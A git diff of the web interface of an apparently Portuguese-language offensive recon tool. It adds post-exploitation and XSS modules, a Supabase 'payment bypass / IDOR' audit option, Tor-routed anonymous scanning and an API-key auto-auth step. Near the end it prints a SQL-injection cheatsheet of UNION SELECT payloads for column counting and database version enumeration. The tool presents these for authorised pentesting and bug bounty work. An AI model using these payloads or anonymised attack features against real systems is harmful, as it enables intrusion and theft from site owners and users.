@@ -717,6 +717,60 @@
     stroke: rgba(126, 232, 192, 0.65);
     stroke-width: 1.15;
   }
+  .mitre-map-btn.history-btn .mitre-map-btn-skin {
+    background: linear-gradient(
+      135deg,
+      rgba(255, 190, 90, 0.28) 0%,
+      rgba(28, 44, 54, 0.92) 54%,
+      rgba(0, 212, 255, 0.15) 100%
+    );
+    box-shadow:
+      0 0 0 1px rgba(255, 190, 90, 0.2),
+      0 4px 24px rgba(0, 0, 0, 0.45),
+      inset 0 1px 0 rgba(255, 255, 255, 0.04);
+  }
+  .mitre-map-btn.history-btn .mitre-map-btn-icon-wrap {
+    border-color: rgba(255, 190, 90, 0.4);
+    background: radial-gradient(circle at 35% 30%, rgba(255, 190, 90, 0.2), transparent 62%),
+      linear-gradient(160deg, rgba(0, 212, 255, 0.1), rgba(255, 190, 90, 0.08));
+  }
+  .mitre-map-btn.history-btn .reporte-hub-svg {
+    color: #ffc46b;
+    filter: drop-shadow(0 0 5px rgba(255, 190, 90, 0.35));
+  }
+
+  /* Post-Exploitation — módulos pós-exploração (vermelho/laranja) */
+  .mitre-map-btn.postex-btn .mitre-map-btn-skin {
+    background: linear-gradient(
+      135deg,
+      rgba(255, 51, 102, 0.28) 0%,
+      rgba(20, 14, 24, 0.92) 54%,
+      rgba(255, 120, 40, 0.15) 100%
+    );
+    box-shadow:
+      0 0 0 1px rgba(255, 51, 102, 0.2),
+      0 4px 24px rgba(0, 0, 0, 0.45),
+      inset 0 1px 0 rgba(255, 255, 255, 0.04);
+  }
+  .mitre-map-btn.postex-btn:focus-visible {
+    outline-color: rgba(255, 51, 102, 0.7);
+  }
+  .mitre-map-btn.postex-btn .mitre-map-btn-icon-wrap {
+    border-color: rgba(255, 51, 102, 0.4);
+    background: radial-gradient(circle at 35% 30%, rgba(255, 51, 102, 0.2), transparent 62%),
+      linear-gradient(160deg, rgba(255, 120, 40, 0.12), rgba(255, 51, 102, 0.1));
+  }
+  .mitre-map-btn.postex-btn .postex-svg {
+    color: #ff6680;
+    filter: drop-shadow(0 0 5px rgba(255, 51, 102, 0.45));
+  }
+  .mitre-map-btn.postex-btn:hover:not(:disabled) .mitre-map-btn-skin {
+    box-shadow:
+      0 0 0 1px rgba(255, 51, 102, 0.55),
+      0 0 28px rgba(255, 51, 102, 0.22),
+      0 8px 32px rgba(0, 0, 0, 0.5),
+      inset 0 1px 0 rgba(255, 255, 255, 0.07);
+  }
 
   /* Reporte — checklist (mesma família Ghostmap/Cortex; fila dedicada abaixo) */
   .hub-actions-wrap {
@@ -2561,7 +2615,10 @@
       <details style="margin-bottom:12px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
         <summary style="cursor:pointer;font-family:var(--mono);font-size:10px;color:var(--accent)">Auth opcional (private program)</summary>
         <div style="margin-top:10px">
-          <div class="toggle-label" style="margin-bottom:6px">Header Authorization (opcional)</div>
+          <div class="toggle-label" style="margin-bottom:6px">GHOSTRECON API Key (obrigatório para servidor autenticado)</div>
+          <input id="ghostreconApiKeyInput" class="domain-input" type="text" placeholder="M-jxxSzvm37..." style="padding:8px 10px">
+          <button type="button" class="find-btn" style="margin-top:6px;width:100%" onclick="autoAuthFromServer({force:true})">Auto-configurar chave do servidor local</button>
+          <div class="toggle-label" style="margin:8px 0 6px">Header Authorization (programa bug bounty)</div>
           <input id="authHeaderInput" class="domain-input" type="text" placeholder="Bearer eyJ..." style="padding:8px 10px">
           <div class="toggle-label" style="margin:8px 0 6px">Cookie (opcional)</div>
           <input id="authCookieInput" class="domain-input" type="text" placeholder="session=abc123" style="padding:8px 10px">
@@ -2717,6 +2774,40 @@
         <div class="hub-actions-row-mitre">
           <button
             type="button"
+            class="mitre-map-btn history-btn"
+            id="historyHubBtn"
+            title="History — histórico HTTP estilo Burp. Mostra requests feitas pelo recon e corpos POST capturados pelo servidor."
+            aria-label="Abrir History — histórico HTTP do recon em nova janela"
+            onclick="openHistoryPage()"
+          >
+            <span class="mitre-map-btn-skin" aria-hidden="true">
+              <span class="mitre-map-btn-shine"></span>
+              <span class="mitre-map-btn-inner">
+                <span class="mitre-map-btn-icon-wrap ghostmap-globe-frame">
+                  <span class="ghostmap-orbit ghostmap-orbit--a" aria-hidden="true"></span>
+                  <span class="ghostmap-orbit ghostmap-orbit--b" aria-hidden="true"></span>
+                  <svg class="reporte-hub-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false">
+                    <path d="M3 5h18" />
+                    <path d="M3 12h18" />
+                    <path d="M3 19h18" />
+                    <path d="M7 5v14" />
+                    <path d="M15 5v14" />
+                  </svg>
+                </span>
+                <span class="mitre-map-btn-copy">
+                  <span class="mitre-map-btn-title">History</span>
+                </span>
+                <span class="mitre-map-btn-aside">
+                  <span class="mitre-map-btn-live"><span class="mitre-map-btn-live-dot"></span> HTTP</span>
+                  <span class="mitre-map-btn-arrow" aria-hidden="true">↗</span>
+                </span>
+              </span>
+            </span>
+          </button>
+        </div>
+        <div class="hub-actions-row-mitre">
+          <button
+            type="button"
             class="mitre-map-btn reporte-hub-btn"
             id="reporteHubBtn"
             title="Checklist manual + SQLite. Abre com os achados da sessão; com o recon a correr, a aba Reporte actualiza ao vivo (BroadcastChannel, mesmo canal que o Ghostmap). Importar JSON: painel «Importar»."
@@ -2740,6 +2831,38 @@
                 </span>
                 <span class="mitre-map-btn-aside">
                   <span class="mitre-map-btn-live"><span class="mitre-map-btn-live-dot"></span> checklist</span>
+                  <span class="mitre-map-btn-arrow" aria-hidden="true">↗</span>
+                </span>
+              </span>
+            </span>
+          </button>
+        </div>
+        <div class="hub-actions-row-mitre">
+          <button
+            type="button"
+            class="mitre-map-btn postex-btn"
+            id="postexHubBtn"
+            title="Pós-Exploração — LinPEAS, Port Forwarding, SearchSploit, Shell Estável, File Transfer, Pivoting, Persistência, Credenciais."
+            aria-label="Abrir módulos de pós-exploração em nova janela"
+            onclick="openPostExPage()"
+          >
+            <span class="mitre-map-btn-skin" aria-hidden="true">
+              <span class="mitre-map-btn-shine"></span>
+              <span class="mitre-map-btn-inner">
+                <span class="mitre-map-btn-icon-wrap ghostmap-globe-frame">
+                  <span class="ghostmap-orbit ghostmap-orbit--a" aria-hidden="true"></span>
+                  <span class="ghostmap-orbit ghostmap-orbit--b" aria-hidden="true"></span>
+                  <svg class="postex-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false">
+                    <path d="M12 2L2 7l10 5 10-5-10-5z"/>
+                    <path d="M2 17l10 5 10-5"/>
+                    <path d="M2 12l10 5 10-5"/>
+                  </svg>
+                </span>
+                <span class="mitre-map-btn-copy">
+                  <span class="mitre-map-btn-title">Pós-Exploração</span>
+                </span>
+                <span class="mitre-map-btn-aside">
+                  <span class="mitre-map-btn-live"><span class="mitre-map-btn-live-dot"></span> módulos</span>
                   <span class="mitre-map-btn-arrow" aria-hidden="true">↗</span>
                 </span>
               </span>
@@ -2887,6 +3010,7 @@
         <label class="checkbox-item"><input type="checkbox" class="mod" value="waybackurls"><div class="checkbox-box"></div><span class="checkbox-text">waybackurls (archive URLs)</span><span class="tag tag-low">CLI</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="rdap"><div class="checkbox-box"></div><span class="checkbox-text">RDAP (registo domínio)</span><span class="tag tag-low">WHOIS+</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="lovable_fingerprint"><div class="checkbox-box"></div><span class="checkbox-text">Lovable fingerprint (RLS/secrets/auth)</span><span class="tag tag-high">HIGH</span></label>
+        <label class="checkbox-item" title="Auditoria aprofundada Supabase: rate limiting, 2FA, IDOR em user_plans, business logic, bypass de pagamento e manipulação de campos Stripe. Probes de escrita requerem GHOSTRECON_SUPABASE_AUTH_TOKEN."><input type="checkbox" class="mod" value="supabase_audit"><div class="checkbox-box"></div><span class="checkbox-text">Supabase audit (payment bypass / IDOR / BL)</span><span class="tag tag-high">CRIT</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="curl_probe"><div class="checkbox-box"></div><span class="checkbox-text">Curl probe (métodos/auth/CORS/diff)</span><span class="tag tag-med">MED</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="security_headers" checked><div class="checkbox-box"></div><span class="checkbox-text">Headers HTTP + TLS</span><span class="tag tag-med">MED</span></label>
         <label class="checkbox-item" title="Após cada GET do probe: cabeçalhos suspeitos (stack, debug, proxy) e bloco sugerido para /etc/hosts quando houver vhost nos headers.">
@@ -2944,35 +3068,18 @@
 
       <div class="module-group">
         <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:8px">
-          <div class="module-group-title" style="margin-bottom:0">// Shell — TTY</div>
+          <div class="module-group-title" style="margin-bottom:0">// XSS</div>
           <button
             type="button"
             class="sqlmap-help-btn"
-            title="Abrir cheatsheet de estabilização de shell (janela)"
-            onclick="openShellStabilizeModal()"
+            title="Biblioteca de payloads XSS — clássicos, bypass de filtro, DOM, SVG, event handlers"
+            onclick="openXssHelpModal()"
           >
-            Shell
+            XSS
           </button>
         </div>
         <p class="gh-hint" style="font-size:10px;margin:-4px 0 8px;line-height:1.45">
-          Referência para <strong>shell estável / TTY completo</strong> em pentest autorizado. Clica em <strong>Shell</strong> para abrir o pop-up com os comandos (copiar por linha). O servidor <strong>não executa</strong> nada.
-        </p>
-      </div>
-
-      <div class="module-group">
-        <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:4px">
-          <div class="module-group-title" style="margin-bottom:0">// LinPEAS</div>
-          <button
-            type="button"
-            class="sqlmap-help-btn"
-            title="Copiar: wget da última release oficial (PEASS-ng)"
-            onclick="copyLinpeasWgetCmd(this)"
-          >
-            Linpeas
-          </button>
-        </div>
-        <p class="gh-hint" style="font-size:10px;margin:0;line-height:1.45">
-          Script de enumeração Linux (PEASS-ng). O botão <strong>Linpeas</strong> copia o <code>wget</code> para a área de transferência — sem pop-up. Só em alvos autorizados.
+          Payloads XSS por categoria: clássicos, bypass de filtro, event handlers, DOM, SVG/HTML5 e contexto de atributo. Só em alvos autorizados (bug bounty / pentest).
         </p>
       </div>
 
@@ -3628,6 +3735,7 @@ function getOptionalAuthConfig() {
     const j = JSON.parse(raw);
     if (!j || typeof j !== 'object') return null;
     return {
+      ghostreconApiKey: j.ghostreconApiKey ? String(j.ghostreconApiKey) : '',
       headers: j.headers && typeof j.headers === 'object' ? j.headers : {},
       cookie: j.cookie ? String(j.cookie) : '',
     };
@@ -3667,6 +3775,7 @@ function getReconProfile() {
 }
 
 function saveAuthConfig() {
+  const ghostreconApiKey = (document.getElementById('ghostreconApiKeyInput')?.value || '').trim();
   const authHeader = (document.getElementById('authHeaderInput')?.value || '').trim();
   const authCookie = (document.getElementById('authCookieInput')?.value || '').trim();
   const useProgramHeaders = Boolean(document.getElementById('programHeadersToggle')?.checked);
@@ -3678,6 +3787,7 @@ function saveAuthConfig() {
     Object.assign(headers, extra);
   }
   const payload = {
+    ghostreconApiKey,
     headers,
     cookie: authCookie,
     programHeadersEnabled: useProgramHeaders,
@@ -3689,11 +3799,13 @@ function saveAuthConfig() {
 
 function clearAuthConfig() {
   localStorage.removeItem('ghostrecon_auth_json');
+  const g = document.getElementById('ghostreconApiKeyInput');
   const h = document.getElementById('authHeaderInput');
   const c = document.getElementById('authCookieInput');
   const t = document.getElementById('programHeadersToggle');
   const w = document.getElementById('programHeadersWrap');
   const p = document.getElementById('programHeadersInput');
+  if (g) g.value = '';
   if (h) h.value = '';
   if (c) c.value = '';
   if (t) t.checked = false;
@@ -3713,6 +3825,46 @@ function initProfileUi() {
   });
 }
 
+async function autoAuthFromServer({ force = false } = {}) {
+  try {
+    if (!force && localStorage.getItem('ghostrecon_auth_json')) return;
+
+    addLog('A buscar chave do servidor local…', 'info');
+    const res = await fetch(apiUrl('/api/setup/auto-auth'));
+    if (!res.ok) {
+      addLog(`Auto-auth: HTTP ${res.status} — servidor não acessível ou sem chaves configuradas.`, 'error');
+      return;
+    }
+    const data = await res.json();
+    if (!data?.apiKey) {
+      addLog('Auto-auth: servidor não devolveu chave.', 'error');
+      return;
+    }
+
+    localStorage.setItem('ghostrecon_auth_json', JSON.stringify({
+      ghostreconApiKey: data.apiKey,
+      headers: {},
+      cookie: '',
+      programHeadersEnabled: false,
+      programHeadersRaw: '',
+    }));
+    const g = document.getElementById('ghostreconApiKeyInput');
+    if (g) g.value = data.apiKey;
+
+    // Verifica se a chave funciona num endpoint protegido
+    const testRes = await fetch(apiUrl('/api/runs'), {
+      headers: { 'X-API-Key': data.apiKey },
+    });
+    if (testRes.ok) {
+      addLog(`Servidor: HTTP ${testRes.status} OK — autenticado com sucesso.`, 'ok');
+    } else {
+      addLog(`Servidor: HTTP ${testRes.status} — chave salva mas pedido de teste falhou.`, 'warn');
+    }
+  } catch (e) {
+    addLog(`Auto-auth: erro — ${e.message}`, 'error');
+  }
+}
+
 function initAuthUi() {
   const t = document.getElementById('programHeadersToggle');
   const w = document.getElementById('programHeadersWrap');
@@ -3727,9 +3879,11 @@ function initAuthUi() {
       return;
     }
     const j = JSON.parse(raw);
+    const g = document.getElementById('ghostreconApiKeyInput');
     const h = document.getElementById('authHeaderInput');
     const c = document.getElementById('authCookieInput');
     const p = document.getElementById('programHeadersInput');
+    if (g && j?.ghostreconApiKey) g.value = String(j.ghostreconApiKey);
     if (h && j?.headers?.Authorization) h.value = String(j.headers.Authorization);
     if (c && j?.cookie) c.value = String(j.cookie);
     if (t) t.checked = Boolean(j?.programHeadersEnabled);
@@ -3969,7 +4123,12 @@ function addLogDockerPullOutput(logText, title = 'docker pull (saída)') {
 
 async function ensureCsrfToken(force = false) {
   if (csrfToken && !force) return csrfToken;
-  const res = await fetch(apiUrl('/api/csrf-token'));
+  const authConfig = getOptionalAuthConfig();
+  const fetchHeaders = {};
+  if (authConfig?.ghostreconApiKey) {
+    fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+  }
+  const res = await fetch(apiUrl('/api/csrf-token'), { headers: fetchHeaders });
   if (!res.ok) throw new Error(`falha ao obter token CSRF (HTTP ${res.status})`);
   const data = await res.json();
   csrfToken = String(data?.token || '');
@@ -4220,7 +4379,12 @@ async function showIntelCorpusStrip(domain) {
   el.innerHTML = '';
   el.style.display = 'none';
   try {
-    const res = await fetch(apiUrl(`/api/intel/${encodeURIComponent(domain)}`));
+    const authConfig = getOptionalAuthConfig();
+    const fetchHeaders = {};
+    if (authConfig?.ghostreconApiKey) {
+      fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+    }
+    const res = await fetch(apiUrl(`/api/intel/${encodeURIComponent(domain)}`), { headers: fetchHeaders });
     if (!res.ok) return;
     const data = await res.json();
     const items = data.items || [];
@@ -4276,9 +4440,14 @@ async function refreshServerToolPath() {
   }
   try {
     const token = await ensureCsrfToken();
+    const authConfig = getOptionalAuthConfig();
+    const fetchHeaders = { 'Content-Type': 'application/json', 'X-CSRF-Token': token };
+    if (authConfig?.ghostreconApiKey) {
+      fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+    }
     const res = await fetch(apiUrl('/api/tool-path-refresh'), {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': token },
+      headers: fetchHeaders,
       body: '{}',
     });
     if (!res.ok) throw new Error(String(res.status));
@@ -4332,9 +4501,14 @@ async function setTunnelState(action) {
   if (refreshBtn) refreshBtn.disabled = true;
   try {
     const token = await ensureCsrfToken();
+    const authConfig = getOptionalAuthConfig();
+    const fetchHeaders = { 'Content-Type': 'application/json', 'X-CSRF-Token': token };
+    if (authConfig?.ghostreconApiKey) {
+      fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+    }
     const res = await fetch(apiUrl(endpoint), {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': token },
+      headers: fetchHeaders,
       body: JSON.stringify({ dryRun }),
     });
     const data = await res.json().catch(() => ({}));
@@ -4593,7 +4767,12 @@ async function loadRunsHistory() {
   const el = document.getElementById('runsHistory');
   if (!el) return;
   try {
-    const res = await fetch(apiUrl('/api/runs?limit=10'));
+    const authConfig = getOptionalAuthConfig();
+    const fetchHeaders = {};
+    if (authConfig?.ghostreconApiKey) {
+      fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+    }
+    const res = await fetch(apiUrl('/api/runs?limit=10'), { headers: fetchHeaders });
     if (!res.ok) throw new Error('offline');
     const data = await res.json();
     el.innerHTML = '';
@@ -4628,7 +4807,12 @@ async function loadRunsHistory() {
 
 async function downloadRunFromApi(id) {
   try {
-    const res = await fetch(apiUrl(`/api/runs/${id}`));
+    const authConfig = getOptionalAuthConfig();
+    const fetchHeaders = {};
+    if (authConfig?.ghostreconApiKey) {
+      fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+    }
+    const res = await fetch(apiUrl(`/api/runs/${id}`), { headers: fetchHeaders });
     if (!res.ok) return;
     const run = await res.json();
     download(`ghostrecon_run_${id}.json`, JSON.stringify(run, null, 2), 'application/json');
@@ -4878,6 +5062,22 @@ function openCortexPage(ev) {
   else if (ev && ev.shiftKey) addLog('Cortex: modo demonstração (dados fictícios).', 'info');
 }
 
+function openHistoryPage() {
+  const u = new URL('history.html', window.location.href);
+  const t = ghostreconReportTargetKey();
+  if (t) u.searchParams.set('target', t);
+  const w = window.open(u.href, 'ghostrecon_history', 'noopener,noreferrer');
+  if (!w) addLog('History: popup bloqueado — permite popups ou abre: ' + u.href, 'warn');
+}
+
+function openPostExPage() {
+  const u = new URL('post-exploitation.html', window.location.href);
+  const t = ghostreconReportTargetKey();
+  if (t) u.searchParams.set('target', t);
+  const w = window.open(u.href, 'ghostrecon_postex', 'noopener,noreferrer');
+  if (!w) addLog('Pós-Exploração: popup bloqueado — permite popups ou abre: ' + u.href, 'warn');
+}
+
 function resolveGhostAssistantUrl() {
   try {
     const raw = String(localStorage.getItem('ghostrecon_ghost_ui_url') || '').trim();
@@ -4990,6 +5190,13 @@ async function consumeReconStreamFromResponse(res, batchPreserveCount, batchPosi
 
       if (ev.type === 'shannon_cli' && ev.line != null) addLogShannonCliLine(ev.line);
       if (ev.type === 'log') addLog(ev.msg, ev.level || 'info');
+      if (ev.type === 'http_history' && ev.entry) {
+        try {
+          const bc = new BroadcastChannel('ghostrecon-history');
+          bc.postMessage({ type: 'http_history', entry: ev.entry });
+          bc.close();
+        } catch (_) {}
+      }
       if (ev.type === 'progress') setProgress(ev.pct);
       if (ev.type === 'pipe') {
         setPipe(ev.name, ev.state);
@@ -5319,7 +5526,12 @@ async function startRecon() {
   try {
     if (aiReportsEnabled && lmStudioOnly) {
       addLog('IA LM Studio (fallback local): a validar conexão antes do recon…', 'info');
-      const ping = await fetch(apiUrl('/api/ai/lmstudio-check'));
+      const authConfig = getOptionalAuthConfig();
+      const fetchHeaders = {};
+      if (authConfig?.ghostreconApiKey) {
+        fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+      }
+      const ping = await fetch(apiUrl('/api/ai/lmstudio-check'), { headers: fetchHeaders });
       const out = await ping.json().catch(() => ({}));
       if (!ping.ok || !out?.ok) {
         finishErr(`LM Studio indisponível: ${out?.error || `HTTP ${ping.status}`}. Corrija e tente novamente.`);
@@ -5343,9 +5555,14 @@ async function startRecon() {
           );
           if (wantPull) {
             const tok = await ensureCsrfToken();
+            const authConfig = getOptionalAuthConfig();
+            const fetchHeaders = { 'Content-Type': 'application/json', 'X-CSRF-Token': tok };
+            if (authConfig?.ghostreconApiKey) {
+              fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+            }
             const pr = await fetch(apiUrl('/api/shannon/prep'), {
               method: 'POST',
-              headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': tok },
+              headers: fetchHeaders,
               body: JSON.stringify({ pullUpstream: true }),
             });
             const prj = await pr.json().catch(() => ({}));
@@ -5446,6 +5663,18 @@ async function startRecon() {
       const navDryRun = document.getElementById('navegationDryRunToggle')?.checked !== false;
       streamBody.navegation = { exec: navExec, dryRun: navDryRun };
 
+      const anonModeOn = Boolean(document.getElementById('anonModeToggle')?.checked);
+      const anonTorOn = anonModeOn && Boolean(document.getElementById('anonTorToggle')?.checked);
+      if (anonTorOn) {
+        streamBody.tor = {
+          required: true,
+          strict: true,
+          newnymBeforeRun: true,
+          perTargetCircuit: true,
+        };
+        streamBody.navegation = { exec: true, dryRun: false };
+      }
+
       const identityMod = selectedMods.includes('identity_rotation');
       const idBodyOn = Boolean(document.getElementById('identityBodyEnabledToggle')?.checked);
       const proxyLines = (document.getElementById('identityProxyPoolInput')?.value || '')
@@ -5464,9 +5693,12 @@ async function startRecon() {
         const fixed = fixedFromPopup || proxyLines[0] || '';
         effectiveProxyPool = fixed ? [fixed] : [];
       }
-      if (identityMod || idBodyOn || proxyLines.length) {
+      if (anonTorOn && !effectiveProxyPool.length) {
+        effectiveProxyPool = ['socks5h://127.0.0.1:9050'];
+      }
+      if (identityMod || idBodyOn || proxyLines.length || anonTorOn) {
         streamBody.identity = {
-          enabled: identityMod || idBodyOn || proxyLines.length > 0,
+          enabled: identityMod || idBodyOn || proxyLines.length > 0 || anonTorOn,
           behavior: behaviorOn,
           rotation,
           proxyPool: effectiveProxyPool,
@@ -5514,9 +5746,14 @@ async function startRecon() {
       const statsBaseline = targets.length > 1 ? { ...stats } : null;
 
       const token = await ensureCsrfToken();
+      const authConfig = getOptionalAuthConfig();
+      const fetchHeaders = { 'Content-Type': 'application/json', 'X-CSRF-Token': token };
+      if (authConfig?.ghostreconApiKey) {
+        fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+      }
       const res = await fetch(apiUrl('/api/recon/stream'), {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': token },
+        headers: fetchHeaders,
         body: JSON.stringify(makeStreamBody(rootHost)),
       });
 
@@ -5581,9 +5818,14 @@ async function startRecon() {
               ? { index: i + 1, total: targets.length, cascade: true, subHost, rootHost }
               : { index: 1, total: 1, cascade: true, subHost, rootHost };
           const tokSub = await ensureCsrfToken();
+          const authConfigSub = getOptionalAuthConfig();
+          const fetchHeadersSub = { 'Content-Type': 'application/json', 'X-CSRF-Token': tokSub };
+          if (authConfigSub?.ghostreconApiKey) {
+            fetchHeadersSub['X-API-Key'] = authConfigSub.ghostreconApiKey;
+          }
           const resSub = await fetch(apiUrl('/api/recon/stream'), {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': tokSub },
+            headers: fetchHeadersSub,
             body: JSON.stringify(makeStreamBody(subHost)),
           });
           if (!resSub.ok) {
@@ -5886,10 +6128,19 @@ function applyAnonymousModeOptions() {
   const modProxy = document.getElementById('modKaliProxychains');
   const modIdentity = document.getElementById('modIdentityRotation');
   const navExec = document.getElementById('navegationExecToggle');
+  const navDryRun = document.getElementById('navegationDryRunToggle');
   const kaliMode = document.getElementById('kaliModeToggle');
-  if (!anonMode) return;
+  if (!anonMode) {
+    if (modNavegation) modNavegation.checked = false;
+    if (navExec) navExec.checked = false;
+    if (navDryRun) navDryRun.checked = true;
+    if (modProxy) modProxy.checked = false;
+    if (modIdentity) modIdentity.checked = false;
+    return;
+  }
   if (modNavegation) modNavegation.checked = anonTor;
   if (navExec) navExec.checked = anonTor;
+  if (navDryRun && anonTor) navDryRun.checked = false;
   if (modProxy) modProxy.checked = anonProxy;
   if (modIdentity) modIdentity.checked = anonIdentityRotation;
   if ((anonTor || anonProxy) && kaliMode && !kaliMode.checked && !kaliMode.disabled) kaliMode.checked = true;
@@ -6186,7 +6437,12 @@ function applyPentestgptCapToUI(p) {
 }
 
 async function refreshShannonCapabilities() {
-  const res = await fetch(apiUrl('/api/capabilities'));
+  const authConfig = getOptionalAuthConfig();
+  const fetchHeaders = {};
+  if (authConfig?.ghostreconApiKey) {
+    fetchHeaders['X-API-Key'] = authConfig.ghostreconApiKey;
+  }
+  const res = await fetch(apiUrl('/api/capabilities'), { headers: fetchHeaders });
   if (!res.ok) throw new Error('HTTP ' + res.status);
   const c = await res.json();
   window.__shannonCap = c.shannon || null;
@@ -6376,6 +6632,7 @@ fetchKaliCapabilities();
 loadRunsHistory();
 initProfileUi();
 initAuthUi();
+autoAuthFromServer();
 initEngagementOpsecUi();
 refreshTunnelStatus();
 (function syncGhostmapButtonForBrowser() {
@@ -6488,6 +6745,38 @@ function closePromptInjHelpModal() {
   o.classList.remove('is-open');
   o.setAttribute('aria-hidden', 'true');
   resetPromptInjLang();
+}
+
+function copyXssRow(btn) {
+  const row = btn.closest('.sqlmap-cmd-row');
+  if (!row) return;
+  const code = row.querySelector('.sqlmap-cmd-code');
+  if (!code) return;
+  navigator.clipboard.writeText(code.textContent).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = '✓';
+    setTimeout(() => { btn.textContent = orig; }, 1200);
+  }).catch(() => {
+    const sel = window.getSelection();
+    const range = document.createRange();
+    range.selectNodeContents(code);
+    sel.removeAllRanges();
+    sel.addRange(range);
+  });
+}
+
+function openXssHelpModal() {
+  const o = document.getElementById('xssHelpOverlay');
+  if (!o) return;
+  o.classList.add('is-open');
+  o.setAttribute('aria-hidden', 'false');
+}
+
+function closeXssHelpModal() {
+  const o = document.getElementById('xssHelpOverlay');
+  if (!o) return;
+  o.classList.remove('is-open');
+  o.setAttribute('aria-hidden', 'true');
 }
 </script>
 
@@ -6603,6 +6892,8 @@ function closePromptInjHelpModal() {
         <dd>Leia como <strong>curl_probe</strong> (métodos/auth/CORS/diff).</dd>
         <dt>"Impressão digital adorável"</dt>
         <dd>Leia como <strong>lovable_fingerprint</strong> (RLS/segredos/auth).</dd>
+        <dt>"Auditoria Supabase" / "Bypass pagamento"</dt>
+        <dd>Leia como <strong>supabase_audit</strong> — testa rate limiting, 2FA, IDOR em user_plans, business logic em study_records, manipulação de campos Stripe e escalada de pagamento. Probes de escrita requerem <code>GHOSTRECON_SUPABASE_AUTH_TOKEN</code>.</dd>
       </dl>
 
       <dl class="findings-help-dl">
@@ -6849,43 +7140,317 @@ function closePromptInjHelpModal() {
     aria-modal="true"
     aria-labelledby="sqlmapHelpTitle"
     onclick="event.stopPropagation()"
-    style="width: min(720px, 100%)"
+    style="width: min(860px, 100%)"
   >
     <button type="button" class="findings-help-close" onclick="closeSqlmapHelpModal()" aria-label="Fechar">×</button>
     <div class="findings-help-dialog-head">
-      <h2 id="sqlmapHelpTitle">SQLMAP — AJUDA</h2>
+      <h2 id="sqlmapHelpTitle">SQLi — CHEATSHEET + SQLMAP</h2>
       <p class="findings-help-intro">
-        Modelos de comando para o terminal. Substitui <code>URL</code>, <code>PARAM</code>, <code>DB</code>, <code>TBL</code> e os nomes das colunas pelos valores reais (ex.: após o verify ou um hit do pipeline). Cada linha tem <strong>Copiar</strong>.
+        Técnicas manuais de SQLi por categoria e comandos sqlmap. Substitui <code>URL</code>, <code>PARAM</code>, <code>DB</code>, <code>TBL</code>, <code>col1</code>, <code>col2</code> e <code>X</code> pelos valores reais. Cada linha tem <strong>Copiar</strong>. Só em alvos autorizados.
       </p>
     </div>
     <div class="findings-help-scroll">
-      <div class="sqlmap-cmd-list" aria-label="Comandos sqlmap de referência">
+
+      <h3 class="findings-help-section-title" style="margin-top:0">Nº de colunas (UNION NULL)</h3>
+      <div class="sqlmap-cmd-list" aria-label="Number of columns">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MySQL/MSSQL/PG</span>
+          <code class="sqlmap-cmd-code">'UNION SELECT NULL,NULL,NULL -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Oracle</span>
+          <code class="sqlmap-cmd-code">'UNION SELECT NULL,NULL,NULL FROM DUAL -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">ORDER BY (+1)</span>
+          <code class="sqlmap-cmd-code">' UNION ORDER BY 1 -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Enumeração de base de dados</h3>
+      <div class="sqlmap-cmd-list" aria-label="Database enumeration">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MySQL/MSSQL</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT @@version -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Oracle v1</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT banner from v$version -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Oracle v2</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT version from v$instance -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Postgres</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT version() -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Enumeração de tabelas</h3>
